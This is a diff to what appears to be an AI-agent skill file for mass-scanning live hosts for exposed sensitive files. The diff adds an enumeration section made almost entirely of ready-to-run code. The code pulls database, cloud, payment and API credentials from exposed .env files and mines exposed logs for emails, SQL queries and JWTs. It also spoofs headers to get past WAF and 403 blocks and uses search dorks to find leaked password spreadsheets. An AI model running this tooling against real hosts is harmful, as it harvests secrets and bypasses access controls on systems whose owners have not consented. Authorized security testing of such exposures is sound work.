@@ -1,6 +1,6 @@
 ---
 name: source-leak-hunt
-description: Mass scan for exposed env files, backups, and git configs.
+description: "Mass-scan live hosts for exposed sensitive files (.env, .git, wp-config backups, logs, dumps, phpinfo) with content-based verification, then extend into parameter discovery, URL categorization, WAF bypass, and historical recovery. Absorbs the former web-enumeration skill."
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
@@ -179,6 +179,182 @@ for f in $OUTDIR/leaks/*_leaks.txt; do
   count=$(wc -l < "$f")
   [[ "$count" -ge 3 ]] && echo "$(basename "$f" _leaks.txt): $count leaks"
 done | sort -t: -k2 -rn
+```
+
+---
+
+## Extended Enumeration (merged from web-enumeration)
+
+The sections below extend the leak scan into broader web enumeration: credential extraction from `.env` bodies, framework log mining, cache detection, parameter and URL-category mapping, WAF bypass, and historical recovery. Virtual-host enumeration is owned by `vhost-enumeration`; path-traversal bypasses are owned by `hunt-lfi` and `401-403-bypass-techniques`.
+
+See `references/batch-probe-methodology.md` for the bounded batch-probe template that pairs with this section.
+
+## Automatic .env Credential Extraction
+
+```python
+import re
+env_content = requests.get("http://target/.env", timeout=10).text
+patterns = {
+    "DB_HOST": r"DB_HOST=(.+)",
+    "DB_DATABASE": r"DB_DATABASE=(.+)",
+    "DB_USERNAME": r"DB_USERNAME=(.+)",
+    "DB_PASSWORD": r"DB_PASSWORD=(.+)",
+    "APP_KEY": r"APP_KEY=(.+)",
+    "APP_URL": r"APP_URL=(.+)",
+    "REDIS_HOST": r"REDIS_HOST=(.+)",
+    "REDIS_PASSWORD": r"REDIS_PASSWORD=(.+)",
+    "MAIL_USERNAME": r"MAIL_USERNAME=(.+)",
+    "MAIL_PASSWORD": r"MAIL_PASSWORD=(.+)",
+    "AWS_KEY": r"AWS_(?:ACCESS_KEY_ID|SECRET_ACCESS_KEY)=(.+)",
+    "SENDGRID": r"SENDGRID_API_KEY=(.+)",
+    "SENTRY": r"SENTRY_DSN=(.+)",
+    "JWT_SECRET": r"JWT_SECRET=(.+)",
+    "OAUTH": r"OAUTH_(?:CLIENT_ID|CLIENT_SECRET)=(.+)",
+    "FIREBASE": r"FIREBASE_.+=(.+)",
+    "OPENAI": r"OPENAI_API_KEY=(.+)",
+    "STRIPE": r"STRIPE_(?:KEY|SECRET)=(.+)",
+}
+for name, pattern in patterns.items():
+    matches = re.findall(pattern, env_content)
+    for m in matches:
+        print(f"KEY {name}: {m.strip()}")
+```
+
+## Log Data Extraction
+
+```python
+log = requests.get("http://target/storage/logs/laravel.log", timeout=30).text
+emails = set(re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', log))
+for e in sorted(emails):
+    if not e.endswith(('.png','.jpg','.svg','.css','.js','.ico','.woff')):
+        print(f"EMAIL {e}")
+sqls = re.findall(r'(?:SQL:|Executing query:|query:)\s*(.*?)(?:\\\\|$)', log)
+for s in set(sqls):
+    if len(s) > 10:
+        print(f"QUERY {s[:200]}")
+jwts = re.findall(r'eyJ[a-zA-Z0-9_\-]{20,}\.[a-zA-Z0-9_\-]{20,}\.[a-zA-Z0-9_\-]{20,}', log)
+for j in set(jwts):
+    print(f"JWT {j[:80]}...")
+paths_found = set(re.findall(r'(?:in |at )/(?:[a-zA-Z0-9_\-./]+\.(?:php|js|ts|py|rb))', log))
+for p in sorted(paths_found):
+    print(f"PATH {p}")
+```
+
+## Varnish Cache Detection
+
+```bash
+# Detect cache headers
+curl --max-time 30 --connect-timeout 10 -sI "https://TARGET/" | grep -iE "(age|x-cache|via|server)"
+# Via: 1.1 varnish = Varnish
+# X-Cache: Hit from cloudfront = AWS CloudFront
+# Cf-Cache-Status: HIT = Cloudflare
+# Varnish Extreme TTL (32 days):
+curl --max-time 30 --connect-timeout 10 -sI "https://TARGET/" | grep -iE "age:|max-age|x-cache"
+```
+
+### Phase 6 — Parameter Discovery
+
+Find hidden parameters on known endpoints:
+
+```bash
+# paramspider — finds parameters from Wayback data
+paramspider -d target.com -o params.txt
+
+# arjun — discovers hidden parameters via HTTP response comparison
+arjun -i backend_urls.txt -o arjun_params.json
+arjun -u https://target.com/endpoint -m POST
+
+# x8 — hidden parameter discovery
+x8 -u "https://target.com/endpoint" -o x8_params.txt
+
+# Prepare URLs for parameter fuzzing
+cat all_urls.txt | grep "=" | qsreplace "FUZZ" | anew param_fuzz.txt
+# Deduplicate by parameter name
+cat all_urls.txt | grep "=" | sed "s/=[^&]*/=/g" | sort -u > params_clean.txt
+```
+
+### Phase 7 — URL Category Extraction
+
+Categorize discovered URLs by sensitivity to prioritize testing:
+
+```bash
+# JavaScript files (for secret hunting)
+cat all_urls.txt | grep -iE '\.js(\?|$)' | grep -iv '\.json' | sort -u > js_urls.txt
+
+# API endpoints
+cat all_urls.txt | grep -Ei '\.(json|xml|graphql)(\?|$)' > api_urls.txt
+
+# Backend scripts
+cat all_urls.txt | grep -Ei '\.(php|asp|aspx|jsp|cfm|cgi)(\?|$)' > backend_urls.txt
+
+# Auth/login flows
+cat all_urls.txt | grep -Ei "login|signin|auth|oauth|reset|password" > auth_urls.txt
+
+# Admin panels
+cat all_urls.txt | grep -Ei "admin|dashboard|internal|manage|panel" > admin_urls.txt
+
+# File upload/download
+cat all_urls.txt | grep -Ei "upload|file|download|image|media" > upload_urls.txt
+
+# IDOR candidates
+cat all_urls.txt | grep -Ei "[0-9]{3,}" > idor_candidates.txt
+
+# Open redirect candidates
+cat all_urls.txt | grep -Ei "redirect|callback|goto|return|dest=|r=|u=|url=" > redirect_urls.txt
+
+# Everything interesting in one shot
+cat all_urls.txt | urinteresting
+```
+
+### Phase 8 — WAF & 403 Bypass
+
+```bash
+# IP header spoofing
+ffuf -u https://target.com/blocked-path \
+  -w 403_bypass_headers.txt \
+  -H "FUZZ" \
+  -mc 200,301,302
+
+# Common bypass headers
+curl --max-time 30 --connect-timeout 10 -sk "https://target.com/admin" \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -H "X-Forwarded-Host: 127.0.0.1" \
+  -H "X-Custom-IP-Authorization: 127.0.0.1" \
+  -H "X-Original-URL: /admin" \
+  -H "X-Rewrite-URL: /admin"
+
+# HTTP method switching
+for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
+  echo -n "$method: "
+  curl --max-time 30 --connect-timeout 10 -sk -X "$method" "https://target.com/admin" -o /dev/null -w "%{http_code}"
+  echo
+done
+
+# Path override techniques
+curl --max-time 30 --connect-timeout 10 -sk "https://target.com/anything" -H "X-Original-URL: /admin"
+curl --max-time 30 --connect-timeout 10 -sk "https://target.com/anything" -H "X-Rewrite-URL: /admin"
+```
+
+### Phase 9 — Historical Page Recovery & Robots.txt History
+
+```bash
+# Robots.txt history via roboxtractor
+cat alive_subs.txt | roboxtractor -m 1 -wb
+
+# Recover 404 pages via Wayback Machine
+waybackurls https://target.com | grep "webstat\|/old/\|/v1/\|/deprecated" > old_pages.txt
+
+# For each old page, re-crawl linked resources
+gospider -s https://target.com -a -r \
+  | grep -oE 'https?://[^[:space:]"]+' \
+  | grep "/old-path/"
+
+# Google Sheets leak hunting
+# site:*.target.com intext:"docs.google.com/spreadsheets"
+# site:docs.google.com/spreadsheets "target.com" "password"
+
+# GitHub endpoints: find internal API paths in repos
+github-endpoints -q -k -d target.com -t $GITHUB_TOKEN
 ```
 
 ## Pitfalls
